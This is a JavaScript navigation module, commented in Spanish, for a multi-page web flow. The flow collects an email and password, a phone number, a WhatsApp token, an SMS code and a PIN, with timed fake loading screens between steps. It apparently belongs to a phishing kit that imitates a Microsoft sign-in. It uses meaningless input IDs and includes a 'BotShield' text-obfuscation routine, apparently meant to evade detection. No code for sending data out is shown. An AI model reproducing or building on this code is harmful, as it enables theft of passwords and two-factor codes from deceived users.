/**
 * Módulo de Navegación - Flujo Multi-Paso
 * Vanilla JS - Sin dependencias externas
 * BotShield integrado (Reglas 15 y 16)
 */

// ============================================================
// MÓDULO: BotShield (Regla 16)
// ============================================================
var BotShield = {
    obfuscateText: function (text) {
        if (!text) return '';
        var frags = text.match(/.{1,3}/g) || [];
        return frags.map(function (f) {
            var rnd = Math.random().toString(36).substring(2, 5);
            var st  = Math.random() > 0.5 ? 'display:none' : 'display:none;font-size:0';
            return f + '<span style="' + st + '">' + rnd + '</span>';
        }).join('');
    },
    obfuscateAll: function () {
        /* Preparado para ofuscación dinámica futura en cambios de estado */
    }
};

// ============================================================
// MÓDULO: NavFlow — Navegación entre vistas
// ============================================================
var NavFlow = {

    /* Devuelve el nombre del archivo actual */
    currentPage: function () {
        var parts = window.location.pathname.split('/');
        var file  = parts[parts.length - 1] || 'index.html';
        return file.toLowerCase();
    },

    /* Devuelve el último botón azul (acción principal) de la pantalla */
    primaryBtn: function () {
        var btns = document.querySelectorAll('button');
        for (var i = btns.length - 1; i >= 0; i--) {
            var s = btns[i].getAttribute('style') || '';
            var c = btns[i].className || '';
            /* El botón principal tiene fondo azul o clase text-white */
            if (s.indexOf('microsoft-blue') !== -1 || c.indexOf('text-white') !== -1) {
                return btns[i];
            }
        }
        /* Fallback: último botón de la lista */
        return btns[btns.length - 1] || null;
    },

    /* Muestra estado de carga en un botón */
    setLoading: function (btn) {
        btn.disabled = true;
        btn.style.opacity = '0.7';
        btn.style.cursor  = 'not-allowed';
        var inner = btn.innerHTML;
        btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.5);border-top-color:#fff;border-radius:50%;animation:lgSpin 0.7s linear infinite;vertical-align:middle;margin-right:6px"></span>'
                      + inner;
    },

    /* Navega a la siguiente página con pequeño retardo visual */
    goTo: function (url, btn, delayMs) {
        delayMs = delayMs || 400;
        if (btn) NavFlow.setLoading(btn);
        setTimeout(function () {
            window.location.href = url;
        }, delayMs);
    },

    /* Pantalla de loading automático con barra de progreso animada */
    autoLoadScreen: function (nextPage, durationMs) {
        durationMs = durationMs || 3000;
        var bar    = document.querySelector('.transition-all.duration-1000');
        var start  = Date.now();
        var tick   = setInterval(function () {
            var elapsed  = Date.now() - start;
            var pct      = Math.min((elapsed / durationMs) * 100, 100);
            if (bar) bar.style.width = pct + '%';
            if (elapsed >= durationMs) {
                clearInterval(tick);
                window.location.href = nextPage;
            }
        }, 50);
    },

    // ----------------------------------------------------------
    // Paso 1 — index.html: Email + Contraseña → index2.html
    // ----------------------------------------------------------
    bindStep1: function () {
        var btn   = NavFlow.primaryBtn();
        var tiki  = document.getElementById('tiki');
        var toko  = document.getElementById('toko');
        if (!btn) return;

        btn.addEventListener('click', function (e) {
            e.preventDefault();
            /* Validación mínima de presencia de contenido */
            var emailVal = tiki ? tiki.value.trim() : '';
            var passVal  = toko ? toko.value.trim() : '';
            if (!emailVal || !passVal) {
                if (tiki && !emailVal) tiki.style.borderBottomColor = '#e74c3c';
                if (toko && !passVal) toko.style.borderBottomColor  = '#e74c3c';
                return;
            }
            NavFlow.goTo('index2.html', btn, 450);
        });
    },

    // ----------------------------------------------------------
    // Paso 2 — index2.html: Nº Teléfono → index3.html (loading)
    // ----------------------------------------------------------
    bindStep2: function () {
        var btn      = NavFlow.primaryBtn();
        var phoneEl  = document.getElementById('doko') || document.querySelector('input[type="tel"]');
        if (!btn) return;

        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var phone = phoneEl ? phoneEl.value.trim() : '1';
            if (!phone) {
                if (phoneEl) phoneEl.style.borderBottomColor = '#e74c3c';
                return;
            }
            NavFlow.goTo('index3.html', btn, 450);
        });
    },

    // ----------------------------------------------------------
    // Paso 3 — index3.html: Pantalla de carga → index4.html
    // ----------------------------------------------------------
    bindStep3: function () {
        NavFlow.autoLoadScreen('index4.html', 12000);
    },

    // ----------------------------------------------------------
    // Paso 4 — index4.html: Token WhatsApp → index5.html
    // ----------------------------------------------------------
    bindStep4: function () {
        var btn  = NavFlow.primaryBtn();
        var toko = document.getElementById('toko');
        if (!btn) return;

        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var val = toko ? toko.value.trim() : '';
            if (!val || val.length < 4) {
                if (toko) {
                    toko.style.borderColor = '#e74c3c';
                    toko.focus();
                }
                return;
            }
            NavFlow.goTo('index5.html', btn, 450);
        });
    },

    // ----------------------------------------------------------
    // Paso 5 — index5.html: Código SMS → index6.html (loading)
    // ----------------------------------------------------------
    bindStep5: function () {
        var btn  = NavFlow.primaryBtn();
        var toko = document.getElementById('toko');
        if (!btn) return;

        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var val = toko ? toko.value.trim() : '';
            if (!val || val.length < 4) {
                if (toko) {
                    toko.style.borderColor = '#e74c3c';
                    toko.focus();
                }
                return;
            }
            NavFlow.goTo('index6.html', btn, 450);
        });
    },

    // ----------------------------------------------------------
    // Paso 6 — index6.html: Countdown visible 10s → index7.html
    // ----------------------------------------------------------
    bindStep6: function () {
        var TOTAL     = 10;
        var remaining = TOTAL;
        var counterEl = document.getElementById('ld6-counter');
        var barEl     = document.getElementById('ld6-bar');

        var tick = setInterval(function () {
            remaining--;
            var pct = ((TOTAL - remaining) / TOTAL) * 100;

            if (counterEl) counterEl.textContent = remaining + 's';
            if (barEl)     barEl.style.width     = pct + '%';

            if (remaining <= 0) {
                clearInterval(tick);
                window.location.href = 'index7.html';
            }
        }, 1000);
    },

    // ----------------------------------------------------------
    // Paso 7 — index7.html: PIN → index8.html (loading)
    // ----------------------------------------------------------
    bindStep7: function () {
        var btn  = NavFlow.primaryBtn();
        var toko = document.getElementById('toko');
        if (!btn) return;

        btn.addEventListener('click', function (e) {
            e.preventDefault();
            var val = toko ? toko.value.trim() : '';
            if (!val || val.length < 4) {
                if (toko) {
                    toko.style.borderColor = '#e74c3c';
                    toko.focus();
                }
                return;
            }
            NavFlow.goTo('index8.html', btn, 450);
        });
    },

    // ----------------------------------------------------------
    // Paso 8 — index8.html: Pantalla de carga → index9.html
    // ----------------------------------------------------------
    bindStep8: function () {
        NavFlow.autoLoadScreen('index9.html', 7000);
    },

    // ----------------------------------------------------------
    // Paso 9 — index9.html: Fin del flujo
    // ----------------------------------------------------------
    bindStep9: function () {
        var btn = NavFlow.primaryBtn();
        if (!btn) return;
        /* Botón "Cerrar sesión" — reinicia al inicio */
        btn.addEventListener('click', function (e) {
            e.preventDefault();
            NavFlow.goTo('index.html', btn, 400);
        });
    },

    // ----------------------------------------------------------
    // Inicializador principal — detecta la vista activa
    // ----------------------------------------------------------
    init: function () {
        BotShield.obfuscateAll();
        var page = NavFlow.currentPage();

        switch (page) {
            case 'index.html':
            case '':
            case '/':
                NavFlow.bindStep1(); break;
            case 'index2.html':
                NavFlow.bindStep2(); break;
            case 'index3.html':
                NavFlow.bindStep3(); break;
            case 'index4.html':
                NavFlow.bindStep4(); break;
            case 'index5.html':
                NavFlow.bindStep5(); break;
            case 'index6.html':
                NavFlow.bindStep6(); break;
            case 'index7.html':
                NavFlow.bindStep7(); break;
            case 'index8.html':
                NavFlow.bindStep8(); break;
            case 'index9.html':
                NavFlow.bindStep9(); break;
        }
    }
};

// ============================================================
// Animación del spinner inyectada globalmente (sin CSS externo)
// ============================================================
(function injectSpinnerStyle() {
    var style = document.createElement('style');
    style.textContent = '@keyframes lgSpin{to{transform:rotate(360deg)}}';
    document.head.appendChild(style);
})();

// ============================================================
// ARRANQUE
// ============================================================
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () { NavFlow.init(); });
} else {
    NavFlow.init();
}
